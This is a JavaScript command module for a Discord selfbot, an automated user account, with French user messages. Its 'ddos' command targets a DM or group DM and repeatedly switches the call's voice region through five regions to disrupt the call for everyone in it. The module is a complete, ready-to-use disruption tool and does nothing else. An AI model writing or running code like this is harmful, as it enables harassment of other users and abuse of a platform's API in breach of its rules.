const { Client, Message } = require("discord.js-selfbot-v13");
const regions = [ "brazil", "hongkong", "india", "japan", "rotterdam" ]

module.exports = {
    name: "ddos",
    description: "DDoS un groupe ou un DM",
    usage: "[channelId]",
    dir: "tools",
    /**
     * @param {Client} client
     * @param {Message} message
     * @param {string[]} args
    */
    run: async (client, message, args) => {
        const channel = message.mentions.channels.first() || client.channels.cache.get(args[0]) || message.channel;
        
        if (!["DM", "GROUP_DM"].includes(channel.type)) 
            return message.edit("***Veuillez entrer l'ID d'un salon DM ou Groupe***");

        message.edit(`***DDoS de ${channel} en cours...***`)
        for (let i = 0; i < regions.length; i++){
            try {
                client.api.channels(channel.id).call.patch({ data: { region: regions[i] } })
                await client.sleep(2000);
            } catch { false }
        }

        message.edit(`***DDoS de ${channel} termine***`)
    }
};